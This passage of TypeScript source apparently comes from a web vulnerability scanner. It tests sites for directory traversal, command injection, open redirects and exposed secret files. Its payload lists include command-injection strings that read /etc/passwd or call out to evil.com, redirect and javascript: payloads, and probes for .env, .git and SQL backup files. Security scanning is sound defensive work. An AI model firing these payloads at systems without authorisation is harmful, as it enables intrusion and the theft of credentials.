          if (response.status === 200 && this.detectSystemFileAccess(response.data)) {
            vulnerabilities.push({
              id: `direct_file_${Date.now()}_${Math.random()}`,
              type: 'Directory Traversal',
              severity: 'Critical',
              title: 'Direct System File Access',
              description: 'System files are directly accessible via web requests.',
              evidence: `Direct access to system file: ${file}`,
              recommendation: 'Restrict access to system files and implement proper web server configuration.',
              cwe: 'CWE-22',
              owasp: 'A01'
            });
            break;
          }
        } catch (error) {
          // Continue testing
        }
      }

    } catch (error) {
      // Continue with other tests
    }

    return vulnerabilities;
  }

  private detectSystemFileAccess(responseData: string): boolean {
    const systemFileIndicators = [
      'root:x:0:0:',
      '# Copyright (c) 1993-2009 Microsoft Corp.',
      'localhost',
      '127.0.0.1',
      '[boot loader]',
      'Linux version',
      'Windows Registry Editor',
      'HKEY_LOCAL_MACHINE'
    ];

    return systemFileIndicators.some(indicator => responseData.includes(indicator));
  }

  private async testCommandInjection(targetUrl: string, forms: any[], links: string[]): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    
    const commandPayloads = [
      // Basic command injection
      '; ls -la',
      '| dir',
      '&& whoami',
      
      // Encoded payloads
      '%3B%20ls%20-la',
      '%7C%20dir',
      
      // Time-based detection
      '; sleep 5',
      '| timeout 5',
      '&& ping -c 5 127.0.0.1',
      
      // Error-based detection
      '; cat /etc/passwd',
      '| type C:\\windows\\system32\\drivers\\etc\\hosts',
      
      // Blind command injection
      '; nslookup evil.com',
      '| nslookup evil.com'
    ];

    // Test URL parameters
    try {
      const urlObj = new URL(targetUrl);
      const cmdParams = ['cmd', 'exec', 'command', 'system', 'ping', 'host', 'ip'];
      
      for (const param of cmdParams.slice(0, 3)) {
        if (!this.isScanning) break;
        
        for (const payload of commandPayloads.slice(0, 3)) {
          urlObj.searchParams.set(param, `test${payload}`);
          
          try {
            const startTime = Date.now();
            const response = await this.makeRequest(urlObj.toString());
            const responseTime = Date.now() - startTime;
            
            // Check for command output
            if (response.data && this.detectCommandOutput(response.data)) {
              vulnerabilities.push({
                id: `cmd_injection_${Date.now()}_${Math.random()}`,
                type: 'Injection',
                severity: 'Critical',
                title: 'Command Injection Vulnerability',
                description: 'Application executes system commands with unsanitized user input.',
                evidence: `Command output detected when injecting payload "${payload}" in parameter "${param}"`,
                recommendation: 'Avoid executing system commands with user input. Use parameterized APIs instead.',
                cwe: 'CWE-78',
                owasp: 'A03'
              });
              break;
            }
            
            // Check for time-based injection
            if ((payload.includes('sleep') || payload.includes('timeout') || payload.includes('ping')) && responseTime > 4000) {
              vulnerabilities.push({
                id: `cmd_time_${Date.now()}_${Math.random()}`,
                type: 'Injection',
                severity: 'Critical',
                title: 'Time-based Command Injection',
                description: 'Application is vulnerable to time-based command injection.',
                evidence: `Response delayed by ${responseTime}ms when using time-based payload "${payload}"`,
                recommendation: 'Sanitize all user inputs and avoid executing system commands.',
                cwe: 'CWE-78',
                owasp: 'A03'
              });
              break;
            }
          } catch (error) {
            // Continue with next payload
          }
        }
      }
    } catch (error) {
      // Continue with other tests
    }

    return vulnerabilities;
  }

  private detectCommandOutput(responseData: string): boolean {
    const commandIndicators = [
      'total ',
      'drwxr-xr-x',
      'Volume in drive',
      'Directory of',
      'uid=',
      'gid=',
      'groups=',
      'PING ',
      'packets transmitted'
    ];

    return commandIndicators.some(indicator => responseData.includes(indicator));
  }

  private async testOpenRedirectAdvanced(targetUrl: string, links: string[]): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    
    const redirectPayloads = [
      // Basic redirects
      'http://evil.com',
      'https://malicious-site.com',
      
      // Protocol-relative URLs
      '//evil.com',
      '//evil.com/path',
      
      // JavaScript redirects
      'javascript:alert("redirect")',
      'javascript:window.location="http://evil.com"',
      
      // Data URLs
      'data:text/html,<script>alert("redirect")</script>',
      
      // Encoded redirects
      'http%3A%2F%2Fevil.com',
      '%2F%2Fevil.com',
      
      // Filter bypass
      'http://evil.com.example.com',
      'http://example.com.evil.com',
      'http://example.com@evil.com',
      
      // Unicode/IDN homograph
      'http://еxample.com', // Cyrillic 'е' instead of 'e'
    ];

    try {
      const urlObj = new URL(targetUrl);
      const redirectParams = ['redirect', 'url', 'next', 'return', 'goto', 'continue', 'returnUrl', 'redirectUrl', 'forward', 'dest', 'destination'];

      for (const param of redirectParams.slice(0, 5)) {
        if (!this.isScanning) break;
        
        for (const payload of redirectPayloads.slice(0, 4)) {
          urlObj.searchParams.set(param, payload);
          
          try {
            const response = await this.makeRequest(urlObj.toString(), {
              maxRedirects: 0,
              validateStatus: (status: number) => status < 400
            });

            // Check for redirect responses
            if (response.status >= 300 && response.status < 400) {
              const location = response.headers.location;
              if (location && this.isExternalRedirect(location, targetUrl)) {
                vulnerabilities.push({
                  id: `open_redirect_${Date.now()}_${Math.random()}`,
                  type: 'Open Redirect',
                  severity: 'Medium',
                  title: 'Open Redirect Vulnerability',
                  description: 'Redirect parameters are not validated, allowing redirection to malicious sites.',
                  evidence: `Successful redirect to external site "${location}" using payload "${payload}" in parameter "${param}"`,
                  recommendation: 'Validate redirect URLs against a whitelist of allowed destinations.',
                  cwe: 'CWE-601',
                  owasp: 'A01'
                });
                return vulnerabilities; // Found one, that's enough for demo
              }
            }

            // Check for JavaScript-based redirects in response
            if (response.data && (
              response.data.includes(`location="${payload}"`) ||
              response.data.includes(`location='${payload}'`) ||
              response.data.includes(`window.location="${payload}"`)
            )) {
              vulnerabilities.push({
                id: `js_redirect_${Date.now()}_${Math.random()}`,
                type: 'Open Redirect',
                severity: 'Medium',
                title: 'JavaScript-based Open Redirect',
                description: 'Client-side redirect is not properly validated.',
                evidence: `JavaScript redirect found with payload "${payload}" in parameter "${param}"`,
                recommendation: 'Validate all redirect URLs on the server side before including in JavaScript.',
                cwe: 'CWE-601',
                owasp: 'A01'
              });
              return vulnerabilities;
            }

          } catch (error) {
            // Continue testing
          }
        }
      }
    } catch (error) {
      // Continue with other tests
    }

    return vulnerabilities;
  }

  private isExternalRedirect(location: string, baseUrl: string): boolean {
    try {
      const baseHost = new URL(baseUrl).host;
      
      if (location.startsWith('//')) {
        const redirectHost = location.substring(2).split('/')[0];
        return redirectHost !== baseHost && !redirectHost.includes('localhost') && !redirectHost.includes('127.0.0.1');
      }
      
      if (location.startsWith('http')) {
        const redirectHost = new URL(location).host;
        return redirectHost !== baseHost && !redirectHost.includes('localhost') && !redirectHost.includes('127.0.0.1');
      }
      
      return false;
    } catch {
      return false;
    }
  }

  private async testInformationDisclosure(targetUrl: string): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    
    const sensitiveFiles = [
      '/.env',
      '/config.php',
      '/wp-config.php',
      '/database.yml',
      '/config/database.yml',
      '/app/config/parameters.yml',
      '/.git/config',
      '/.svn/entries',
      '/backup.sql',
      '/dump.sql',
      '/phpinfo.php',
      '/info.php',
      '/test.php',
      '/robots.txt',
      '/.htaccess',
      '/web.config',
      '/crossdomain.xml',
      '/sitemap.xml'
    ];

    const sensitiveDirectories = [
      '/admin/',
      '/administrator/',
      '/wp-admin/',
      '/phpmyadmin/',
      '/backup/',
      '/backups/',
      '/config/',
      '/includes/',
      '/logs/',
      '/.git/',
      '/.svn/'
    ];

    // Test for sensitive files
    for (const file of sensitiveFiles.slice(0, 8)) {
      if (!this.isScanning) break;
      
      try {
        const fileUrl = `${targetUrl.replace(/\/$/, '')}${file}`;
        const response = await this.makeRequest(fileUrl);
        
        if (response.status === 200 && response.data && this.detectSensitiveContent(response.data, file)) {
          let severity: 'Critical' | 'High' | 'Medium' | 'Low' = 'Medium';
          
          if (file.includes('.env') || file.includes('config') || file.includes('database')) {
            severity = 'High';
          }
          if (file.includes('.git') || file.includes('backup') || file.includes('.sql')) {
            severity = 'Critical';
          }

          vulnerabilities.push({
            id: `info_disclosure_${Date.now()}_${Math.random()}`,
            type: 'Sensitive Data Exposure',
            severity,
            title: 'Sensitive File Disclosure',
            description: 'Sensitive files are accessible via direct web requests.',
            evidence: `Sensitive file accessible at: ${file}`,
            recommendation: 'Restrict access to sensitive files and directories using proper web server configuration.',
            cwe: 'CWE-200',
            owasp: 'A01'
          });
        }
      } catch (error) {
        // Continue testing
      }
    }

    // Test for directory listing
    for (const dir of sensitiveDirectories.slice(0, 5)) {
      if (!this.isScanning) break;
      
      try {
        const dirUrl = `${targetUrl.replace(/\/$/, '')}${dir}`;
        const response = await this.makeRequest(dirUrl);
        
        if (response.status === 200 && response.data && this.detectDirectoryListing(response.data)) {
          vulnerabilities.push({
            id: `dir_listing_${Date.now()}_${Math.random()}`,
            type: 'Sensitive Data Exposure',
            severity: 'Low',
            title: 'Directory Listing Enabled',
            description: 'Directory listing is enabled, revealing file structure.',
            evidence: `Directory listing found at: ${dir}`,
            recommendation: 'Disable directory listing in web server configuration.',
            cwe: 'CWE-200',
            owasp: 'A01'
          });
        }
      } catch (error) {
        // Continue testing
      }
    }

    return vulnerabilities;
  }

  private detectSensitiveContent(responseData: string, filename: string): boolean {
    const sensitivePatterns: { [key: string]: string[] } = {
      '.env': ['DB_PASSWORD', 'API_KEY', 'SECRET', 'PASSWORD'],
      'config': ['password', 'secret', 'key', 'token'],
      '.git': ['[core]', 'repositoryformatversion'],
      '.sql': ['INSERT INTO', 'CREATE TABLE', 'DROP TABLE'],
      'phpinfo': ['PHP Version', 'System', 'Build Date'],
      'robots.txt': ['User-agent:', 'Disallow:', 'Allow:']
    };

    const patterns = Object.entries(sensitivePatterns).find(([key]) => filename.includes(key))?.[1] || [];
    return patterns.some(pattern => responseData.toLowerCase().includes(pattern.toLowerCase()));
  }

  private detectDirectoryListing(responseData: string): boolean {
    const listingIndicators = [
      'Index of /',
      'Directory Listing',
      'Parent Directory',
      '<title>Index of',
      'Last modified</th>',
      '[DIR]',
      'folder.gif'
    ];

    return listingIndicators.some(indicator => responseData.includes(indicator));
  }

  stopScan(): void {
    this.isScanning = false;
  }

  getCurrentScan(): ScanResult | null {
    return this.currentScan;
  }

  private sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}